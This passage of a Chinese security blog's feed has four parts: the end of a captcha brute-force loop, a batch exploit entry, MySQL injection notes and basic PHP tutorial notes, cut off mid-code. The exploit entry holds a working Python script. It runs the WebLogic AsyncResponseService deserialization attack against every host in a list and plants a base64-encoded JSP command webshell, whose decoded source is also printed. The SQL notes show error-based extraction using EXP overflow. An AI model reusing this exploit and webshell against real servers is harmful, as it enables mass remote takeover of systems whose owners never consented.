三位数生成</span></span><br><span class="line">count = <span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> (count &lt; <span class="number">1000</span>):</span><br><span class="line">    print(count)</span><br><span class="line">    shibie(count)</span><br><span class="line"><span class="comment">#判断返还text文本长度，为5则为验证码错误，再重新识别一次验证码，再次将当前密码再测试一次</span></span><br><span class="line">    <span class="keyword">while</span> shibie(count) == <span class="number">5</span>:</span><br><span class="line">        shibie(count)</span><br><span class="line">    count = count + <span class="number">1</span></span><br></pre></td></tr></table></figure><p><img alt data-src="/images/python%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB%E7%88%86%E7%A0%B4/4.png" class="lazyload"></p><p><img alt data-src="/images/python%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB%E7%88%86%E7%A0%B4/5.png" class="lazyload"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一道比赛题目。&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="/categories/python/"/>
    
    
      <category term="python" scheme="/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>exp_批量</title>
    <link href="/2019/04/25/exp_%E6%89%B9%E9%87%8F/"/>
    <id>/2019/04/25/exp_批量/</id>
    <published>2019-04-25T04:00:00.000Z</published>
    <updated>2019-04-26T13:44:36.238Z</updated>
    
    <content type="html"><![CDATA[<p>今早还没睡醒，就爆出来的洞，exp部分抄别人的，批量自己小小的写了一点。</p><a id="more"></a><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>exp函数部分摘取自<a href="https://github.com/jas502n/CNVD-C-2019-48814" title="CNVD-C-2019-48814">CNVD-C-2019-48814</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">duqu</span><span class="params">()</span>:</span></span><br><span class="line">    f = open(<span class="string">'7001.txt'</span>, <span class="string">'r'</span>)  <span class="comment"># 文件为7001.txt</span></span><br><span class="line">    sourceInLines = f.readlines()  <span class="comment"># 按行读出文件内容</span></span><br><span class="line">    f.close()</span><br><span class="line">    new = []  <span class="comment"># 定义一个空列表，用来存储结果</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> sourceInLines:</span><br><span class="line">        temp1 = line.strip(<span class="string">'\n'</span>)  <span class="comment"># 去掉每行最后的换行符'\n'</span></span><br><span class="line">        exp(temp1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(temp1)</span>:</span></span><br><span class="line">    url = <span class="string">"http://"</span> + temp1</span><br><span class="line">    url_dir = <span class="string">"/_async/AsyncResponseService"</span></span><br><span class="line">    vuln_url = url + url_dir</span><br><span class="line">    webshell_name = <span class="string">'shell.jsp'</span></span><br><span class="line">    webshell_dir = <span class="string">"servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/"</span></span><br><span class="line">    payload = <span class="string">"&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"&gt;   &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt;&lt;java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"&gt;\r\n      &lt;void class=\"java.lang.ProcessBuilder\"&gt;\r\n        &lt;array class=\"java.lang.String\" length=\"3\"&gt;\r\n          &lt;void index=\"0\"&gt;\r\n            &lt;string&gt;/bin/bash&lt;/string&gt;\r\n          &lt;/void&gt;\r\n          &lt;void index=\"1\"&gt;\r\n            &lt;string&gt;-c&lt;/string&gt;\r\n          &lt;/void&gt;\r\n          &lt;void index=\"2\"&gt;\r\n            &lt;string&gt;echo IDwlQCBwYWdlIGltcG9ydD0iamF2YS51dGlsLiosamF2YS5pby4qIiU+CjwlCiU+CjxIVE1MPjxCT0RZPgpDb21tYW5kcyB3aXRoIEpTUAo8Rk9STSBNRVRIT0Q9IkdFVCIgTkFNRT0ibXlmb3JtIiBBQ1RJT049IiI+CjxJTlBVVCBUWVBFPSJ0ZXh0IiBOQU1FPSJjbWQiPgo8SU5QVVQgVFlQRT0ic3VibWl0IiBWQUxVRT0iU2VuZCI+CjwvRk9STT4KPHByZT4KPCUKaWYgKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSAhPSBudWxsKSB7CiAgICBvdXQucHJpbnRsbigiQ29tbWFuZDogIiArIHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSArICI8QlI+Iik7CiAgICBQcm9jZXNzIHA7CiAgICBpZiAoIFN5c3RlbS5nZXRQcm9wZXJ0eSgib3MubmFtZSIpLnRvTG93ZXJDYXNlKCkuaW5kZXhPZigid2luZG93cyIpICE9IC0xKXsKICAgICAgICBwID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiY21kLmV4ZSAvQyAiICsgcmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKTsKICAgIH0KICAgIGVsc2V7CiAgICAgICAgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKTsKICAgIH0KICAgIE91dHB1dFN0cmVhbSBvcyA9IHAuZ2V0T3V0cHV0U3RyZWFtKCk7CiAgICBJbnB1dFN0cmVhbSBpbiA9IHAuZ2V0SW5wdXRTdHJlYW0oKTsKICAgIERhdGFJbnB1dFN0cmVhbSBkaXMgPSBuZXcgRGF0YUlucHV0U3RyZWFtKGluKTsKICAgIFN0cmluZyBkaXNyID0gZGlzLnJlYWRMaW5lKCk7CiAgICB3aGlsZSAoIGRpc3IgIT0gbnVsbCApIHsKICAgIG91dC5wcmludGxuKGRpc3IpOwogICAgZGlzciA9IGRpcy5yZWFkTGluZSgpOwogICAgfQp9CiU+CjwvcHJlPgo8L0JPRFk+PC9IVE1MPiAKCg== |base64 -d &gt; %s%s&lt;/string&gt;\r\n          &lt;/void&gt;\r\n        &lt;/array&gt;\r\n        &lt;void method=\"start\"/&gt;&lt;/void&gt;\r\n    &lt;/java&gt;\r\n&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;"</span> % (</span><br><span class="line">        webshell_dir, webshell_name)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">        <span class="string">'Connection'</span>: <span class="string">"close"</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">"text/xml"</span>,</span><br><span class="line">        <span class="string">'Content-Length'</span>: <span class="string">"2163"</span>,</span><br><span class="line">        <span class="string">'cache-control'</span>: <span class="string">"no-cache"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        response = requests.request(<span class="string">"POST"</span>, vuln_url, data=payload, headers=headers, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="comment">#将shell的路径写入文本</span></span><br><span class="line">        <span class="comment"># f = open('test.txt','w+')</span></span><br><span class="line">        <span class="comment"># f.write(url + "/bea_wls_internal/" + webshell_name + "?cmd=whoami"+' \n')</span></span><br><span class="line">        <span class="keyword">print</span> url + <span class="string">"/bea_wls_internal/"</span> + webshell_name + <span class="string">"?cmd=whoami"</span></span><br><span class="line">        print(response.text)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> temp1 + <span class="string">'    Exceeding time duration'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">duqu()</span><br></pre></td></tr></table></figure><p><img alt data-src="/images/exp_%E6%89%B9%E9%87%8F/1.png" class="lazyload"></p><h1 id="payload解析"><a href="#payload解析" class="headerlink" title="payload解析"></a>payload解析</h1><p>exp函数函数部分就是提交一个post请求<br>用Linux命令echo写一个jsp_shell<br>shell的内容是：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">%&gt;</span><br><span class="line">&lt;HTML&gt;&lt;BODY&gt;</span><br><span class="line">Commands with JSP</span><br><span class="line">&lt;FORM METHOD=<span class="string">"GET"</span> NAME=<span class="string">"myform"</span> ACTION=<span class="string">""</span>&gt;</span><br><span class="line">&lt;INPUT TYPE=<span class="string">"text"</span> NAME=<span class="string">"cmd"</span>&gt;</span><br><span class="line">&lt;INPUT TYPE=<span class="string">"submit"</span> VALUE=<span class="string">"Send"</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span> (request.getParameter(<span class="string">"cmd"</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">    out.println(<span class="string">"Command: "</span> + request.getParameter(<span class="string">"cmd"</span>) + <span class="string">"&lt;BR&gt;"</span>);</span><br><span class="line">    Process p;</span><br><span class="line">    <span class="keyword">if</span> ( System.getProperty(<span class="string">"os.name"</span>).toLowerCase().indexOf(<span class="string">"windows"</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">        p = Runtime.getRuntime().exec(<span class="string">"cmd.exe /C "</span> + request.getParameter(<span class="string">"cmd"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        p = Runtime.getRuntime().exec(request.getParameter(<span class="string">"cmd"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    OutputStream os = p.getOutputStream();</span><br><span class="line">    InputStream in = p.getInputStream();</span><br><span class="line">    DataInputStream dis = <span class="keyword">new</span> DataInputStream(in);</span><br><span class="line">    String disr = dis.readLine();</span><br><span class="line">    <span class="keyword">while</span> ( disr != <span class="keyword">null</span> ) &#123;</span><br><span class="line">    out.println(disr);</span><br><span class="line">    disr = dis.readLine();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/BODY&gt;&lt;/HTML&gt;</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>朋友人字拖说：weblogin的默认路径不一定是/_async/AsyncResponseService</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今早还没睡醒，就爆出来的洞，exp部分抄别人的，批量自己小小的写了一点。&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="/categories/python/"/>
    
    
      <category term="python" scheme="/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>SQL笔记</title>
    <link href="/2019/04/21/SQL%E7%AC%94%E8%AE%B0/"/>
    <id>/2019/04/21/SQL笔记/</id>
    <published>2019-04-21T09:00:00.000Z</published>
    <updated>2019-04-27T07:52:22.992Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL笔记"><a href="#SQL笔记" class="headerlink" title="SQL笔记"></a>SQL笔记</h1><h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><h3 id="exp函数报错注入"><a href="#exp函数报错注入" class="headerlink" title="exp函数报错注入"></a>exp函数报错注入</h3><blockquote><p>exp溢出报错注入。利用exp溢出报错做布尔判断。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT EXP(710)</span><br></pre></td></tr></table></figure><p><img alt data-src="/images/sql%E7%AC%94%E8%AE%B0/1.png" class="lazyload"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT EXP(709)</span><br></pre></td></tr></table></figure><p><img alt data-src="/images/sql%E7%AC%94%E8%AE%B0/2.png" class="lazyload"></p><p>在（）括号中构造数值，用ASCII码。</p><p><strong>ASCII码表</strong><br><img alt data-src="/images/sql%E7%AC%94%E8%AE%B0/1.jpg" class="lazyload"></p><p>先看表内的内容。<br><img alt data-src="/images/sql%E7%AC%94%E8%AE%B0/3.png" class="lazyload"></p><p><strong>username字段的第一个内容是admin</strong><br>admin的第一个字母是a，在ASCII码中是97，构造一个语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT EXP(710-ascii(mid(username,1,1))--97) FROM `user`</span><br></pre></td></tr></table></figure><p>（）括号内的就相当于710-97+97</p><blockquote><p>两个 - 相当于+ 加号</p></blockquote><p><img alt data-src="/images/sql%E7%AC%94%E8%AE%B0/4.png" class="lazyload"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">EXP</span>(<span class="number">710</span>-<span class="keyword">ascii</span>(<span class="keyword">mid</span>(username,<span class="number">1</span>,<span class="number">1</span>))<span class="comment">--96) FROM `user`</span></span><br></pre></td></tr></table></figure><p><img alt data-src="/images/sql%E7%AC%94%E8%AE%B0/5.png" class="lazyload"></p><h3 id="mysql-a-X"><a href="#mysql-a-X" class="headerlink" title="mysql a.X"></a>mysql a.X</h3><blockquote><p>利用a.X标识位置查询</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">from</span> <span class="keyword">user</span></span><br></pre></td></tr></table></figure><p><img alt data-src="/images/sql%E7%AC%94%E8%AE%B0/6.png" class="lazyload"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a<span class="number">.2</span> <span class="keyword">from</span> (<span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">from</span> <span class="keyword">user</span>)a;</span><br></pre></td></tr></table></figure><p><img alt data-src="/images/sql%E7%AC%94%E8%AE%B0/7.png" class="lazyload"></p><blockquote><p>用a.2标识第二列，查出第二列的内容，将 SELECT 1,2,3 union select 4,5,6 from user 放进()括号中用作别名</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">'admin'</span>;</span><br></pre></td></tr></table></figure><p><img alt data-src="/images/sql%E7%AC%94%E8%AE%B0/8.png" class="lazyload"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(a<span class="number">.2</span>) <span class="keyword">from</span> (<span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">'admin'</span>)a;</span><br></pre></td></tr></table></figure><p><img alt data-src="/images/sql%E7%AC%94%E8%AE%B0/9.png" class="lazyload"></p><blockquote><p>查询第二列中，admin对应的内容。</p></blockquote><h1 id="——持续更新——"><a href="#——持续更新——" class="headerlink" title="——持续更新——"></a>——持续更新——</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL笔记&quot;&gt;&lt;a href=&quot;#SQL笔记&quot; class=&quot;headerlink&quot; title=&quot;SQL笔记&quot;&gt;&lt;/a&gt;SQL笔记&lt;/h1&gt;&lt;h2 id=&quot;MYSQL&quot;&gt;&lt;a href=&quot;#MYSQL&quot; class=&quot;headerlink&quot; title=&quot;MYS
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="SQL" scheme="/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>PHP学习笔记</title>
    <link href="/2019/04/16/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>/2019/04/16/PHP学习笔记/</id>
    <published>2019-04-15T16:00:00.000Z</published>
    <updated>2019-05-15T13:21:08.780Z</updated>
    
    <content type="html"><![CDATA[<p>做笔记，以免忘记。</p><a id="more"></a><h1 id="PHP文件"><a href="#PHP文件" class="headerlink" title="PHP文件"></a>PHP文件</h1><p>PHP 脚本在服务器上执行，然后将纯 HTML 结果发送回浏览器。 </p><p>PHP 脚本可以放在文档中的任何位置。</p><p>PHP 脚本以 尖括号、问号、PHP<?php 开始，以 ?> 问号、尖括号结束</p><p><strong>注意事项：</strong> </p><p>PHP 中的每个代码行都必须以分号结束。分号是一种分隔符，用于把指令集区分开来。 </p><h1 id="PHP变量"><a href="#PHP变量" class="headerlink" title="PHP变量"></a>PHP变量</h1><p><strong>变量</strong>是用于存储信息的”容器”： </p><p>我们在PHP中的变量也是如此。不过有几个<strong>特点</strong>：</p><ol><li><p>必须要以$ 开始</p></li><li><p>变量的首字母不能以数字开始</p></li><li><p>变量的名字区分大小写</p></li><li><p>变量不要用特殊符号、中文，_不算特殊符号</p></li><li><p>变量命名要有意义（别写xxx，aaa，ccc这种 变量名）</p></li><li><p>$ 叫作美元符，英文单词：dollar。PHP的变量必须以美元符开始。说明搞PHP有“钱”图</p></li></ol><h2 id="PHP变量作用域"><a href="#PHP变量作用域" class="headerlink" title="PHP变量作用域"></a>PHP变量作用域</h2><p>PHP 有四种不同的变量作用域：</p><p>·   <strong>local</strong>         </p><p>·   <strong>global</strong>        </p><p>·   <strong>static</strong>         </p><p>·   <strong>parameter</strong></p><h3 id="global"><a href="#global" class="headerlink" title="global"></a>global</h3><p>global 关键字用于函数内访问全局变量。 </p><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><p>当一个函数完成时，它的所有变量通常都会被删除。然而，有时候您希望某个局部变量不要被删除。</p><p>要做到这一点，请在您第一次声明变量时使用 <strong>static</strong> 关键字</p><h1 id="PHP-echo-和-print-语句"><a href="#PHP-echo-和-print-语句" class="headerlink" title="PHP echo 和 print 语句"></a>PHP echo 和 print 语句</h1><p>echo 和 print 区别:</p><ul><li>echo - 可以输出一个或多个字符串</li><li>print - 只允许输出一个字符串，返回值总为 1</li></ul><p><strong>提示：</strong>echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。</p><h1 id="PHP的数据类型"><a href="#PHP的数据类型" class="headerlink" title="PHP的数据类型"></a>PHP的数据类型</h1><p>String（字符串）, Integer（整型）, Float（浮点型）, Boolean（布尔型）, Array（数组）, Object（对象）, NULL（空值）。</p><h2 id="PHP对象"><a href="#PHP对象" class="headerlink" title="PHP对象"></a>PHP对象</h2><p>对象数据类型也可以用于存储数据。</p><p>在 PHP 中，对象必须声明。</p><p>首先，你必须使用class关键字声明类对象。类是可以包含属性和方法的结构。</p><p>然后我们在类中定义数据类型，然后在实例化的类中使用数据类型：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $color;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($color=<span class="string">"green"</span>)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;color = $color;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">what_color</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;color;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_vars</span><span class="params">($obj)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">foreach</span> (get_object_vars($obj) <span class="keyword">as</span> $prop =&gt; $val) &#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"\t$prop = $val\n"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例一个对象</span></span><br><span class="line">$herbie = <span class="keyword">new</span> Car(<span class="string">"white"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示 herbie 属性</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\therbie: Properties\n"</span>;</span><br><span class="line">print_vars($herbie);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="PHP常量"><a href="#PHP常量" class="headerlink" title="PHP常量"></a>PHP常量</h1><p>设置常量，使用 define() 函数，函数语法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool define ( string $name , mixed $value [, bool $case_insensitive = <span class="keyword">false</span> ] )</span><br></pre></td></tr></table></figure><p>该函数有三个参数:</p><ul><li><strong>name：</strong>必选参数，常量名称，即标志符。</li><li><strong>value：</strong>必选参数，常量的值。</li><li><strong>case_insensitive</strong> ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。</li></ul><p><strong>常量在定义后，默认是全局变量，可以在整个运行的脚本的任何地方使用。</strong> </p><h1 id="PHP运算符"><a href="#PHP运算符" class="headerlink" title="PHP运算符"></a>PHP运算符</h1><h2 id="PHP-逻辑运算符"><a href="#PHP-逻辑运算符" class="headerlink" title="PHP 逻辑运算符"></a>PHP 逻辑运算符</h2><table><thead><tr><th>运算符</th><th>名称</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>x and y</td><td>与</td><td>如果 x 和 y 都为 true，则返回 true</td><td>x=6 y=3  (x &lt; 10 and y &gt; 1) 返回 true</td></tr><tr><td>x or y</td><td>或</td><td>如果 x 和 y 至少有一个为 true，则返回 true</td><td>x=6 y=3  (x==6 or y==5) 返回 true</td></tr><tr><td>x xor y</td><td>异或</td><td>如果 x 和 y 有且仅有一个为 true，则返回 true</td><td>x=6 y=3  (x==6 xor y==3) 返回 false</td></tr><tr><td>x &amp;&amp; y</td><td>与</td><td>如果 x 和 y 都为 true，则返回 true</td><td>x=6 y=3 (x &lt; 10 &amp;&amp; y &gt; 1) 返回 true</td></tr><tr><td>x || y</td><td>或</td><td>如果 x 和 y 至少有一个为 true，则返回 true</td><td>x=6 y=3 (x==5 || y==5) 返回 false</td></tr><tr><td>! x</td><td>非</td><td>如果 x 不为 true，则返回 true</td><td>x=6 y=3 !(x==y) 返回 true</td></tr></tbody></table><h2 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h2><p>另一个条件运算符是”?:”（或三元）运算符 。</p><h3 id="语法格式"><a href="#语法格式" class="headerlink" title="语法格式"></a>语法格式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(expr1) ? (expr2) : (expr3)</span><br></pre></td></tr></table></figure><p>对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3。</p><p>自 PHP 5.3 起，可以省略三元运算符中间那部分。表达式 expr1 ?: expr3 在 expr1 求值为 TRUE 时返回 expr1，否则返回 expr3。</p><h1 id="PHP-Switch-语句"><a href="#PHP-Switch-语句" class="headerlink" title="PHP Switch 语句"></a>PHP Switch 语句</h1><hr><p>switch 语句用于根据多个不同条件执行不同动作。</p><hr><h2 id="PHP-Switch-语句-1"><a href="#PHP-Switch-语句-1" class="headerlink" title="PHP Switch 语句"></a>PHP Switch 语句</h2><p>如果您希望<strong>有选择地执行若干代码块之一</strong>，请使用 switch 语句。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">switch</span> (n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> label1:</span><br><span class="line">    如果 n=label1，此处代码将执行;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> label2:</span><br><span class="line">    如果 n=label2，此处代码将执行;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    如果 n 既不等于 label1 也不等于 label2，此处代码将执行;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>工作原理：首先对一个简单的表达式 <em>n</em>（通常是变量）进行一次计算。将表达式的值与结构中每个 case 的值进行比较。如果存在匹配，则执行与 case 关联的代码。代码执行后，使用 <strong>break</strong> 来阻止代码跳入下一个 case 中继续执行。<strong>default</strong> 语句用于不存在匹配（即没有 case 为真）时执行。</p><h1 id="PHP-数组"><a href="#PHP-数组" class="headerlink" title="PHP 数组"></a>PHP 数组</h1><p>在 PHP 中，array() 函数用于创建数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span 